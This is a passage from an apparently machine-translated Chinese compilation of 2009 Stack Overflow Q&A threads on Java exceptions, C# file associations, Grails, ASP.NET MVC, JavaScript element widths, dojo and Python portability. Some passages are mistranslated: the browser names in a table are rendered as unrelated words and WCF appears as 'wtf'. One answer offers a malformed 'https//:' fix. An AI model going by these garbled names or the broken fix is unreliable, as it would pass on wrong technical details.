您的新异常应该是 Runtime 还是 Checked？这取决于，一般规则是抛出运行时编程错误并检查可恢复的条件。

如果可以通过正确编程（例如 NullPointerException 或 IndexOutOfBounds ）避免异常，请使用 Runtime

如果异常是由于程序员无法控制的某些外部资源（例如网络关闭）并且可以做一些事情（在 5 分钟内显示重试消息或其他内容），则应使用检查异常.

如果异常不受程序员的控制，但无能为力，则可以使用 RuntimeException。例如，您应该写入一个文件，但该文件已被删除，您无法重新创建它或重试，那么程序应该会失败（您对此无能为力）很可能是运行时。

请参阅 Effective Java 中的以下两项：

*   对可恢复条件使用检查异常，对编程错误使用运行时异常
*   抛出适合抽象的异常

我希望这有帮助。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-01-08T18:16:09.710

如果您没有明确说明`read()`会引发异常，那么当它发生时您会令开发人员感到惊讶。

在您的特定情况下，我会捕获底层异常并将它们重新抛出为新的异常类`DataException`或`DataReadException`.

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-01-08T18:15:54.500

抛出适合“ ”类`IOException`的异常类型。`Data`事实是该`read`方法并不总是能够提供数据，它可能应该指出原因。包装异常可能会扩展`RuntimeException`，因此不需要声明（尽管应该适当记录）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-08T19:17:49.510

使用运行时异常，并结合顶部的爆炸式捕获所有内容。刚开始有点吓人，习惯了就好了。

在我的 Web 应用程序中，抛出的一切都是运行时。几乎没有“抛出”子句，而且我只有在我真正可以（或想要）处理异常的地方有 catchblocks。在最高级别，有一个 catch Throwable，它呈现一个技术错误页面，并写入一个日志条目。

Log4J 邮件程序向我发送日志条目和它前面的 10 个日志条目。所以当客户来电时，我通常已经知道有问题了。

通过适当的（单元）测试和干净的编程，增加的清洁度和可读性超过了任何时候检查异常的损失。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T18:34:04.777

您*应该*在抽象 read() 方法上声明某种异常。抽象类实际上是在声明一个接口——并且您已经从两个具体的子类中知道，由于异常情况，实现很可能无法成功返回。

因此，在抽象 Data.read() 方法中声明一些异常是完全正确的。不要试图简单地声明它抛出 IOException，因为它不应该与特定的实现绑定（否则你必须声明它也可以抛出 SQLException，以防你决定拥有一个数据库 -读取子类，SAXException 以防您曾经有一个基于 XML 的阅读器（使用 SAX），等等）。您将需要自己的自定义异常，在抽象级别充分捕获这一点 - 类似于上面推荐的 DataException，或者如果有意义的话，可能会重用同一包中的现有自定义异常。

# ruby - RDoc CONSTANT 评论？

> ID：425284
> 
> 赞同：0
> 
> 时间：2009-01-08T18:13:55.503
> 
> 标签：ruby, documentation, comments, constants, rdoc

在 RDoc 中，有没有办法显示不断的评论？我想在我的一个项目中评论一个常量，但意识到它们没有出现在 RDoc 输出中。我检查了可能对其常量有评论的文档，但从未看到任何（[http://www.ruby-doc.org/core/classes/Math.html](http://www.ruby-doc.org/core/classes/Math.html)）。

他们可能会在常量旁边显示实现，因为假设这是不言自明的，但似乎评论也会有所帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-09T16:58:02.747

它对我来说很好，只需在常量行上方添加注释即可。您是否尝试过将代码和相关常量放入模块中？

我认为 Math 模块的文档没有对常量进行注释的原因是因为它是一个 C 模块。

# c# - 从数据文件启动应用程序

> ID：425292
> 
> 赞同：3
> 
> 时间：2009-01-08T18:17:01.677
> 
> 标签：c#, double-click

双击 Word 文档时，Word 会自动运行并加载文档。

对我的 C# 应用程序执行相同操作需要哪些步骤？

换句话说，假设我的应用程序使用“.XYZ”数据文件。我知道如何在双击 .XYZ 数据文件时告诉 Windows 启动我的应用程序。 **但是我如何在我的应用程序中找出选择了什么数据文件以便我可以加载它？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T18:31:22.333

虽然这是一个 VB.NET 解决方案，但[本文](http://www.codeproject.com/KB/vb/VBFileAssociation.aspx)详细介绍了如何在注册表中为您的应用程序创建文件关联，以及如何在启动应用程序以进行正确的文件处理时检索命令参数。

它看起来很容易移植到 C#。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-08T18:24:24.280

参数应包含数据文件的路径。

您可以调整此行为并传递其他参数。查看此图像中的示例。此处文件路径与 %1 一起传递。

[Quicktime 文件关联对话框](http://img340.imageshack.us/my.php?image=clipboard01oi6.jpg)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T18:25:47.587

我认为您正在寻找的是命令行参数。例如，如果您查看 .doc 的 Open 操作，您可能会看到类似“word.exe %1”的内容。Windows 将获取文件名并将其替换为 %1，然后执行命令“word.exewhatever.doc”。然后在应用程序中，您可以看到作为参数传递到程序中的[内容，请参阅这篇 MSDN 文章了解更多详细信息](http://msdn.microsoft.com/en-us/library/acy3edy3(VS.80).aspx)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T18:27:56.070

我相信这只是一个传递到您的应用程序中的命令行参数。然后您可以使用 Environment.GetCommandLineArgs 阅读它。我知道如果您将文件拖放到您的应用程序中，情况就是如此。我还没有完成您所描述的自己，但我认为它的工作方式相同。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-08T18:50:02.263

我在不久前从事的一个项目中做到了这一点，并且手头没有源代码，但我相信它真的归结为：

```
 //program.cs
    [STAThread]
    static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        if (args.Length > 0)
        {
            //launch same form as normal or different
            Application.Run(new Form1(args));
        }
        else
        {
            Application.Run(new Form1());
        }
    } 
```

args is empty when the application is normally started, but when you've properly linked in the association to your .xyz file, when one of those files is selected, your application will be launched with the file location as the first element of the string []。当然，无论是在 program.cs 还是您的启动表单中，我都会添加验证，但在基本级别，我相信这是您需要做的。

# sql - Grails 中的 SQL/数据库视图

> ID：425294
> 
> 赞同：28
> 
> 时间：2009-01-08T18:17:48.740
> 
> 标签：sql, database, grails, view

有谁知道通过 Grails 访问 sql 视图的最佳方法是什么（或者这是否可能）？这样做的一个明显方法是对视图使用 executeQuery 从视图中选择一组行，我们不会将其视为域对象列表。然而，即使在这种情况下，对哪个域类运行 executeQuery 也并不明显，因为实际上我们只是使用该域类来针对完全不相关的实体（视图）运行查询。

是否更愿意创建一个表示视图的域类，然后我们可以对那个域类使用 list() ？这似乎会出现问题，因为 Grails 可能希望能够插入、更新、删除和修改任何域类的表模式。

[编辑：
在此跟进问题：[Grails Domain Class without ID field or with partial NULL complex field](https://stackoverflow.com/questions/430004/grails-domain-class-without-id-field-or-with-partially-null-composite-field])

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2009-01-08T18:38:29.213

您可以在 Grails 中使用普通 SQL，这是在以首选方式访问视图的情况下（IMO）：

例如在您的控制器中：

```
import groovy.sql.Sql

class MyFancySqlController {

    def dataSource // the Spring-Bean "dataSource" is auto-injected

    def list = {
        def db = new Sql(dataSource) // Create a new instance of groovy.sql.Sql with the DB of the Grails app

        def result = db.rows("SELECT foo, bar FROM my_view") // Perform the query

        [ result: result ] // return the results as model
    }

} 
```

和视图部分：

```
<g:each in="${result}">
    <tr>
        <td>${it.foo}</td>
        <td>${it.bar}</td>
    </tr>
</g:each> 
```

我希望来源是不言自明的。[文档可以在这里](http://groovy.codehaus.org/Database+features)找到

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-07-21T23:12:56.713

你可以把它放在你的域类映射中：

```
static mapping = {
    cache 'read-only'
} 
```

但我不确定它是否有助于 Hibernate 理解这是一个视图...... [http://docs.jboss.org/hibernate/stable/core/reference/en/html_single/#performance-cache-readonly](http://docs.jboss.org/hibernate/stable/core/reference/en/html_single/#performance-cache-readonly)

无论如何，在我们当前的项目中，我们经常使用数据库视图作为 grails 域类，因为 HQL 很麻烦，而且使用 SQL 连接表更简单。

不过，您需要注意的一件事是 Hibernate 批处理查询（以及整个刷新业务）。如果您在表中插入某些内容，然后在同一个事务中选择依赖于该表的视图，您将不会获得最新插入的行。这是因为 Hibernate 实际上还没有插入行，而如果您选择了插入行的表，Hibernate 会发现它需要在为您提供选择结果之前刷新其挂起的查询。

一种解决方案是 ( `flush:true`) 在保存域实例时，您知道以后需要在同一事务中通读视图。

然而，如果有某种方式告诉 Hibernate 一个视图/域依赖于哪些其他域类，那就太酷了，这样 Hibernate 刷新可以无缝地工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-09T11:01:54.080

完全可以将域类映射到视图，只需将其视为常规表即可。我认为 Grails 会打印一些关于无法执行插入、删除等操作的日志消息，但它不会抛出任何错误，除非您实际上尝试执行域类查询以外的操作。

# c# - 使用 smo 重命名数据文件

> ID：425296
> 
> 赞同：2
> 
> 时间：2009-01-08T18:20:51.450
> 
> 标签：c#, .net, sql-server, sql-server-2008, smo

如何使用 SMO 重命名物理 .mdf .ndf .ldf 文件。 [这篇](http://sqlforums.windowsitpro.com/web/forum/messageview.aspx?catid=83&threadid=88362&enterthread=y)文章很有帮助，但我需要使用 C# SMO 对象。

使用 SMO 服务器对象，我可以检索数据库，然后访问 DataFile 对象。根据这个[链接](http://technet.microsoft.com/en-us/library/ms162192.aspx)。这些有重命名，但是重命名后，没有任何变化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T18:41:42.563

好吧，我还没有尝试过，但是根据您的第一个链接，您可以分离数据库，重命名磁盘上的文件，然后重新附加数据库。所以，试一试。

SMO 中的 Server 对象具有您可以使用的 Detach(..) 和 Attach(..) 方法。然后，只需使用 File.Move(..) 重命名文件。

# asp.net-mvc - MVC 是编写 asp.net 应用程序的最佳方式吗？

> ID：425306
> 
> 赞同：7
> 
> 时间：2009-01-08T18:24:50.240
> 
> 标签：asp.net-mvc, model-view-controller, design-patterns

更新：我知道没有一种最好的方法可以做所有事情。很抱歉没有马上说出来。在数据访问教程的上下文中，如果您必须完成他在该教程中所做的项目，如果您必须选择其中之一，您会做他所做的还是会使用 MVC？

**更新：** MVC 是编程 asp.net 应用程序的更合适的方法，而不是此处找到的教程：

[http://www.asp.net/Learn/data-access/](http://www.asp.net/Learn/data-access/)

**原来的：**

我问，因为我最初是通过 Java 应用程序了解 MVC，然后是 RoR 和 Django。这些其他项目和公司说起来好像 MVC 已经存在了很长时间，而且据我发现它已经存在了。然后微软开始将 MVC 放入 .net 框架中。

我问是因为我不知道如何很好地设计东西，并认为我在模仿 Scott Mitchell 的教程的 asp.net 网站上做得很好。在我发现 MVC 和现在 asp.net 的 MVC 之前，我认为在 BLL 中创建抽象层是可行的方法。

老实说，我不知道做事的“正确”方式是什么。我只是创造我需要的东西，但我不禁觉得我错过了一些东西。

MVC 是在大型项目中开始做事的正确方法吗，特别是我的意思是 MVC 和 ASP.NET，但也可以指 PHP 和他们的 MVC 框架之一。

我想确定一种标准的做事方式……无论如何。

而且，出于好奇，为什么微软现在才开始做 MVC？

**更新：** MVC 是否比 asp.net 上的当前教程更好？

我指的是 Scott Mitchell 的教程，他在其中创建了用于抽象的 BLL。或者这也是一个 linq 问题。我应该说我理解保持逻辑和表示分离的必要性，但不确定最好的方法。我正在使用 asp.net 教程。它工作得很好。然后我发现世界其他地方，正如我所看到的那样，正在使用 MVC。然后微软开始开发 MVC，所以对我来说，另一种方法似乎已经过时并且是错误的做事方式。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2009-01-08T18:31:15.377

不，这不是做事的唯一最佳方式。

MVC 只是一种设计模式。所有设计模式的目标都是简单。因此，只要它使您的设计更简单，就可以使用它。如果它使您的特定应用程序变得更加复杂，请尝试不同的方法。

不幸的是，有些人认为如果他们看到一种模式，就应该使用它。这不是真的。设计模式本身并不能使您的应用程序更好。它们不是终点。它们是达到目的的一种手段（这很简单）。所以你应该只在它们值得的时候使用它们。

在我看来，没有充分理由的过度架构比编写没有任何特定设计的代码更糟糕。

**编辑：**关于 ASP.NET MVC：我对 ASP.NET Web 表单有负面的个人偏见。在 MVC 之前，我通过编写自定义处理程序对 HTML 进行细粒度控制来完成高级项目的大部分动态方面。Web 表单使 Web 开发变得非常容易，但它们有一些特别好的东西，但有时会出现问题。第一个`ViewState`是复杂的架构，第二个是复杂的`WebControl`架构。不要误会我的意思。这些都是 ASP.NET 辉煌的标志。我还没有看到像 ASP.NET Web Forms 那样简单的 Web 开发单一平台，这只是因为`WebControl`需要强大的支持`ViewState`. 但是，在某些项目中，您希望对呈现的 HTML 进行精确控制（特别是当您有一些客户端逻辑时）。您还希望在大型项目中使服务器端代码可维护。在这些领域，ASP.NET MVC 确实大放异彩。但我认为 ASP.NET Web Forms 仍将是一项更适用的伟大技术。毕竟，正如我所说的一般设计模式，您应该仔细评估您的设计，看看哪一个更适合您的需求。

具体来说，关于数据访问，MVC 通常比 Web Forms 需要更多的代码。对于呈现表格数据（即适用于 GridView 的地方），我认为 ASP.NET Web 窗体是完成任务的更简单方法。但是，大多数数据驱动的 Web 应用程序不仅仅是直接在数据库中操作表。他们有复杂的布局。StackOverflow 就是一个很好的例子。它当然是数据驱动的，但 ASP.NET MVC 更适合它。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-01-08T18:34:09.893

不知道“事物”是什么，就没有“正确”的做事方式。MVC 是一种解决特定常见问题的[设计模式- 表示逻辑和域逻辑的分离。](http://en.wikipedia.org/wiki/Design_pattern_(computer_science))每个设计模式都是针对特定问题的普遍接受的“好”解决方案。

这些解决方案与知识和经验相结合，是良好设计的基石。做事的“正确”方法是研究您的问题领域，研究可能的解决方案并应用最有效的解决方案集来解决它。犯错也是这个过程的一部分，所以不要害怕尝试，然后严格[重构](http://en.wikipedia.org/wiki/Code_refactoring)，直到找到最适合你的解决方案。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-08T18:40:23.860

MVC 是开发应用程序最糟糕的方式，除了已经尝试过的所有其他方式。:-)

开个玩笑，MVC 是一种鼓励我们不要编写意大利面条式代码的应用程序设计。这是一个指导方针，提醒我们将业务代码与演示代码分开。随着应用程序变得更加复杂，这非常有用。

还有其他变体可以实现相同的好处，但与 MVC 并不完全相同。 [表示抽象控制](http://en.wikipedia.org/wiki/Presentation-abstraction-control)（PAC）就是一个例子。

至于为什么微软在采用 MVC 方面这么晚，我并不感到惊讶。他们以保守而不是创新而闻名（至少在最近几年）。他们更愿意让其他较小的公司在未经证实的市场中冒险，然后他们从错误中吸取教训，推出过度设计的竞争对手解决方案，并通过营销占据主导地位。

示例：Microsoft Internet Explorer 被认为是浏览器市场的后来者。Netscape 变得非常流行，在为人们提供查看 HTML 的平台方面处于领先地位。一旦 Internet 上的 HTML 内容的数量达到了有用的水平，微软就推出了他们的拟声词“IE”产品，并迅速占领了压倒性的市场份额。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-08T18:31:10.227

MVC 只是一种做事方式。我喜欢它，因为它有助于促进可扩展性，并且其结构允许测试和代码重用。没有灵丹妙药，这是做所有事情的真正方法，但我经常使用它。

关于微软，我想说他们采用这种模式作为 WebForms 开发的替代方案，原因我上面提到了。我建议查看[Rob Conery 的 MVC Storefront](http://blog.wekeroad.com/mvc-storefront/mvc-storefront-part-1/)并尝试使用示例来了解它是如何为您工作的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-08T18:42:46.927

没有“最好”的编码方式。这取决于相关的应用程序；有时 MVC 是正确的选择，有时则不是。优秀的开发人员能够权衡他/她的选项并选择最适合手头任务的选项，而不是仅仅使用当前的*方法*

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-08T19:23:53.820

如果 MVC 解决了管理应用程序复杂性的**主要技术**要求，那么它可能是一个很好的解决方案，但它绝不是唯一的解决方案。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-08T19:33:33.893

MVC 是任意数量的设计模式之一。无论是技术上最好的，还是最简单的，或者适合什么类型的项目，都是有争议的（参见其他 SO 线程）。无论如何，很少有人会反对普遍的共识，即在大多数情况下，它“足够好”。

但它有一个不可否认的好处，那就是很多人在很多不同的平台上使用它。

因此，如果您想使用一种可能会存在一段时间的方法；或者您不想依赖一个供应商来提供支持、扩展和改进；或者你在一个希望通过雇佣来自不同背景的人来成长的团队中工作，这些人将快速掌握一种共享的方法；或者如果需要，您希望最大限度地继续前进，那么 MVC 是支持这些目标的最佳方式之一。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-08T19:43:07.680

MVC 是“更好”或“更差”的模式与项目相关。

# javascript - Javascript/xhtml - 使用溢出发现 div 中内容的总宽度：隐藏

> ID：425308
> 
> 赞同：1
> 
> 时间：2009-01-08T18:25:35.730
> 
> 标签：javascript, css, xhtml

我正在编写一个带有水平滚动缩略图栏的基于 javascript 的照片库。

[>> 我目前正在进行的工作在这里 <<](http://www.sharehost.co.uk/gallerytest/)

我希望缩略图栏在到达最后一个缩略图时停止滚动。为此，我需要找到 div 内容的总宽度 - 最好不要将所有缩略图图像的宽度和边距相加。

我在 window.onload 函数中设置了一个警告，这样我就可以在不同的浏览器中测试各种元素维度函数。目前显示的是scrollWidth的值，IE报告为1540px，FireFox、Safari、Opera等报告为920px。

值 1540 对我来说是正确的，谁能告诉我如何在 FireFox 等中获取这个值。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-08T18:43:13.247

也许您只是引用了错误的元素。

```
document.getElementById('thumb_window').scrollWidth 
```

在 IE6 和 firefox 2 的那个页面上都给了我 1540。这就是你要找的吗？

顺便说一句，在 IE6 中，缩略图延伸到右侧滚动条之外。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T18:40:54.467

我认为您正在寻找“offsetWidth”。对于跨浏览器体验，它的滚动[宽度/高度]或偏移[宽度/高度]，以较大者为准。

```
var elemWidth = (elem.offsetWidth > elem.scrollWidth) ? elem.offsetWidth : elem.scrollWidth;
var elemHeight = (elem.offsetHeight > elem.scrollHeight) ? elem.offsetHeight : elem.scrollHeight; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-08T18:43:44.943

您可以循环浏览服务器端的图像并添加它们的宽度。（在 php 中，您可以使用该[`getImagesize()`](http://au2.php.net/getimagesize)函数来执行此操作）。然后，您可以将所有图像的总宽度传递给 javascript。例如：

```
$total_width=0;
foreach ($images as $image)
{
   $info=getimagesize($image['file_path'];
   $total_width=$total_width +  $info[0];
} 
```

在 JavaScript 中：

```
<script type="text/javascript">
var total_width=<?=$total_width;?>;
</script> 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-01-08T18:41:14.683

你应该做的是找到 div 中的最后一个图像元素，获取它相对于其容器的 X 位置，添加它的宽度，如果有的话，可能还添加它的水平边距。

伪代码：

```
total_width = (last_image.x - container.x) + last_image.width + last_image.left_margin + last_image.right_margin 
```

[使用JQuery](http://jquery.com/)很容易做到这一点，因为它专门内置了获取 .last()、获取相对定位和获取边距宽度的功能。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-01-08T19:33:49.977

这是一张小桌子：-

```
             thumb_window thumb_slide
             滚动宽度偏移宽度滚动宽度偏移宽度
IE7 1540 920 1540 1540
法郎 3.05 1540 920 920 920
歌剧 9.5 1540 920 920 920
野生动物园 3.2 1540 920 1540 920
铬 1.0 1540 920 1540 920

```

# dojo - IE 中的安全和不安全项目消息

> ID：425315
> 
> 赞同：1
> 
> 时间：2009-01-08T18:26:55.650
> 
> 标签：dojo

我在 IE 中收到“此页面包含安全和非安全项目”消息。当我从 dojo.js.uncompressed.js 文件中注释以下代码时，该消息消失了。

```
if(dojo.isIE){
  if(!dojo.config.afterOnLoad){
    document.write('<scr'+'ipt defer src="//:" '
      + 'onreadystatechange="if(this.readyState==\'complete\'){' + dojo._scopeName + '._loadInit();}">'
      + '</scr'+'ipt>'
    );
} 
```

是道场的问题吗？我想将注释代码移动到另一个自定义文件中，以免影响 dojo 框架。您能否提出一种更好的实施方式。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-08T18:47:16.577

如果您使用框架或有外部文件，其中一些文件具有**https** URL，而有些文件具有**http** URL，则会出现该错误。假设您的主页通过 https 加载，您可以尝试更改：

```
src="//:"
```

至：

```
src="https//:"
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-08T18:49:19.193

//: 很可能是问题所在，因为我在一大段 javascript 代码中遇到了类似的问题...在 Internet Explorer 中，位置 //: 不安全，所以当您的页面（大概在 https:// / url) 加载时，IE 注意到您已经从安全位置加载了主代码，并且从不安全的位置加载了另一个脚本。

我想到的解决方法是在我的 Web 根目录中创建一个名为“blank.html”的空文件（尽管“blank.js”在您的情况下可能会更好）并将 //: 链接替换为“/blank.html” ”。这会导致您的网络服务器再次受到攻击，但浏览器缓存可能会将这种影响降至最低。

# c# - 使用 C#，如何在我的项目中将 Url 属性设置为 HTML 文件？

> ID：425325
> 
> 赞同：2
> 
> 时间：2009-01-08T18:28:56.300
> 
> 标签：c#, url

我有以下代码：

```
if (System.IO.File.Exists(htmlLocation))
{
    vEarthBrowser.ObjectForScripting = this;
    vEarthBrowser.Url = new Uri(htmlLocation);
}
else
{
    throw new Exception("HTML file not found!");
} 
```

htmlLocation 定义为：

```
private string htmlLocation = "VirtualEarth.html" 
```

据说我从中得到的项目处于正常工作状态，但我没有更改任何代码。如果我运行它，新的 Uri() 行会给我一个错误，“无效的 URI：无法确定 URI 的格式。”

该文件存在（如成功通过 If 中的 Exists() 方法所示）。当您希望它在默认应用程序目录中加载 HTML 文件时，在 WebBrowser 控件上引用 URL 的正确方法是什么？

编辑：

我应该澄清这是一个 winforms 项目，而不是一个 web 项目。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-08T18:32:13.173

尝试将 htmlLocation 传递给 Path.GetFullPath()。

这会自动返回当前 exe 目录中文件的绝对路径。

这是我编写的辅助函数：

```
public void LoadPageFromDisk(string filePath)
{
    Uri targetPage = null;

    string workingPageURI = filePath.Trim();

    workingPageURI = Path.GetFullPath(workingPageURI);

    if (Uri.TryCreate(workingPageURI, UriKind.RelativeOrAbsolute, out targetPage) == true)
    {

        webBrowserControl.Navigate(targetPage);
    }

} 
```

如果filePath 参数是“localfile.htm”，Path.GetFullPath 将根据当前正在执行的程序集返回它的绝对路径，例如：c:\Program Files\MyApp\localFile.htm。

然后 Uri.TryCreate 为您将绝对文件路径转换为有效的 file:// Uri。

最后 WebBrowser.Navigate 有一个接受 Uri 的重载。（需要 UriKind.RelativeOrAbsolute 才能让 TryCreate 正确解析绝对文件路径。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-08T18:34:27.490

Uri 不处理这样的相对路径。对于驱动器上的文件，您需要使用 file:// 格式来创建 URI。将其与 Path.GetFullPath() 结合起来，您应该离开。

# c# - XML 验证容易受到文化信息的影响？

> ID：425341
> 
> 赞同：0
> 
> 时间：2009-01-08T18:37:14.927
> 
> 标签：c#, xml-validation

项目结束前一天我遇到了一个复杂的问题：我有一个 wtf 服务和 3 个使用它的客户端应用程序。服务有三个方法，每个方法接收一个 xml 文档作为参数并返回 xml 文档。这就是他们交流的方式。我有一些 xsd 文件来验证生成和接收的 xml。直到今天一切正常。我有波兰语窗口，今天我在英语窗口上运行我的应用程序。到目前为止，您可能已经意识到，我从我的应用程序中收到一条消息，指出收到的 xml 无效。我检查了它，在 xml 中被认为是双倍的 VaR 值是用句点写的（或昏迷，我不记得了，但它不起作用）。我现在想知道 - 这个问题有什么好的解决方案吗？我的意思是我像这样验证xml：

```
public bool IsValid(XDocument xmlDocument, Stream xsdContent)
        {
            XmlSchemaSet schemaSet = new XmlSchemaSet();
            XmlReader reader = XmlReader.Create(xsdContent);
            schemaSet.Add(string.Empty, reader);

            valid = true;
            xmlDocument.Validate(schemaSet, (sender, eventt) => { valid = false; e
= eventt; });

            return valid;
        } 
```

我无法告诉验证器 double 中的分隔符应该是什么。我能想到的唯一解决方案是简单地在 xsd 中指定有问题的 VaR 值是一个字符串，然后以编程方式检查它是否是双数，带有句点或逗号。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-08T19:08:28.733

[XML 模式规范](http://www.w3.org/TR/xmlschema-2/#decimal)指定浮点数使用句点而不是逗号来表示。语言环境对什么是有效的 XML 没有任何影响。

你不包括你的错误。希望它抱怨数字中有逗号。

# javascript - 有没有办法在 IE 中请求使用 window.external.AddFavorite 的权限？

> ID：425342
> 
> 赞同：0
> 
> 时间：2009-01-08T18:37:51.883
> 
> 标签：javascript, internet-explorer

我的客户在 Internet Explorer 上的 JavaScript 安全设置不允许使用 window.external.AddFavorite，并且当用户单击我网站上的“添加书签”链接时，它会在状态栏中生成（最好的情况）错误。当安全设置不允许使用其余的 window.external 方法时，是否有办法在 Internet Explorer 中明确请求用户使用 window.external.AddFavorite 方法的权限？

**编辑**

这是我正在使用的代码：

```
<script type="text/javascript">
function addToFavorites() { 
    if (window.sidebar) { // Mozilla uses sidebar 
        window.sidebar.addPanel( document.title, window.location , "");
    } else if (window.external) { // IE uses window.external
        window.external.AddFavorite( window.location, document.title );
    } else { // Who knows ?  Only have to support IE & Moz anyhow.
        alert("Sorry! Your browser doesn't support this function.");
    }
}
</script>

<a href="javascript:addToFavorites()">Bookmark This Page</a> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T20:04:23.660

它会起作用，但它必须由用户驱动的事件触发。（例如链接/按钮的onclick）

这是为了阻止垃圾邮件/广告软件/pr0n 网站自动用垃圾填充您的书签。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2009-01-08T19:36:30.643

我只是将“添加书签”链接从网站上拉下来。如果他们真的想要，用户知道如何做到这一点。

# python - Python 和不同的操作系统

> ID：425343
> 
> 赞同：4
> 
> 时间：2009-01-08T18:38:09.963
> 
> 标签：python, cross-platform

我即将开始一个使用 python 的个人项目，我将在 Linux(Fedora) 和 Windows(Vista) 上使用它，尽管我不妨让它在我使用它的时候在 mac 上工作。我找到了一个适用于所有 3 的 GUI 的 API。我问的原因是因为我一直听说如果你在开始之前了解它们很容易避免小的差异。有没有人有任何符合这些方面的提示或建议？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-08T18:49:31.970

一般来说：

*   小心路径。尽可能使用 os.path。
*   不要假设 HOME 指向用户的 home/profile 目录。
*   避免使用诸如 unix 域套接字、fifos 和其他特定于 POSIX 的东西。

更具体的东西：

*   如果您使用的是 wxPython，请注意，某些事件在哪个线程中生成可能会有所不同。不要假设事件是在特定线程中生成的。如果您正在调用触发 GUI 事件的方法，请不要假设在您的方法返回时事件处理程序已经完成。（当然，反之亦然。）
*   GUI 的显示方式总是存在差异的。布局并不总是以完全相同的方式实现。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-08T18:56:46.137

我在 Python 跨平台开发中注意到的一些事情：

*   OSX 没有托盘，因此应用程序通知通常发生在 Dock 中。因此，如果您正在构建后台通知服务，您可能需要少量特定于平台的代码。
*   os.startfile() 显然只适用于 Windows。Leopard 上的 Python 2.5.1 或 Python 2.5.1 都不支持它。
*   os.normpath() 也是您可能要考虑使用的东西，只是为了使用正确的斜杠表示法和卷名称来保持路径和卷。
*   图标在 Windows 和 OSX 中以完全不同的方式处理，请确保为两者（16x16、24x24、32x32、48x48、64x64、128x128 和 256x256）提供所有正确尺寸的图标，并确保阅读设置图标带有 wx 小部件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-08T18:55:12.130

1.  您应该注意您正在开发的 Python 版本。特别是在 Mac 上，默认安装的 OS 版本的 Python 比较老（当然可以安装更新的版本）

2.  不要使用操作系统特定的库

3.  特别注意“特殊”的 UI 元素，例如任务栏图标（窗口），...

4.  使用路径时使用正斜杠，避免 C:/, /home/..., ... 使用 os.path 处理路径。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-08T19:08:40.213

一些文件名问题：This.File 和 this.file 在 Linux 上是不同的文件，但在 Windows 上指向同一个文件。如果您管理一些文件存储库并从两个平台访问它，就会很麻烦。不太常见的相关问题是诸如 NUL 或 LPT 之类的名称是 Windows 上的文件。

二进制分发代码（如果有的话）可能会在 Win 上使用 py2exe，在 Mac 上使用 py2app，并且不会出现在 Linux 上。

# database-design - 实体之间的抽象引用

> ID：425350
> 
> 赞同：2
> 
> 时间：2009-01-08T18:40:07.230
> 
> 标签：database-design, architecture, business-objects

我即将进行的一个项目正在考虑涉及（我称之为）“抽象实体引用”的设计。这与更常见的数据模型设计大相径庭，但可能需要实现我们想要的灵活性。我想知道其他架构师是否有类似这样的系统的经验以及需要注意的地方。

该项目需要控制各种人员对各种实体（逻辑上：业务对象；物理上：数据库行）的访问。例如，我们可能想要创建如下规则：

*   用户 Alice 是 Z 公司的成员
*   用户 Bob 是 Y 组的经理，该组有用户 Charlie、Dave 和 Eve。
*   用户 Frank 可以为 [关键业务对象] X 以及 [关键业务对象组] U 中的 [关键业务对象] 输入数据。
*   用户 George 不是 T 公司的成员，但可以查看 T 公司的报告。

这个想法是我们有很多不同的安全对象、角色、组和权限，我们想要一个系统来处理这些。理想情况下，该系统一旦启动，几乎不需要对新情况进行编码；它应该非常灵活。

在“传统”数据设计中，我们可能有这样的实体/表：

*   用户
*   公司
*   用户/公司交叉引用
*   用户组
*   用户/用户组交叉引用
*   CBO（“关键业务对象”）
*   用户/CBO 交叉引用
*   CBO集团
*   用户/CBOGroup 交叉引用
*   CBO/CBOGroup 交叉引用
*   ReportAccess，这是用户和公司之间的交叉引用，专门用于访问报告

请注意大量的交叉引用表。这个系统不是很灵活，因为任何时候我们想要添加一种新的访问方式，我们都需要引入一个新的交叉引用表；这反过来又意味着额外的编码。

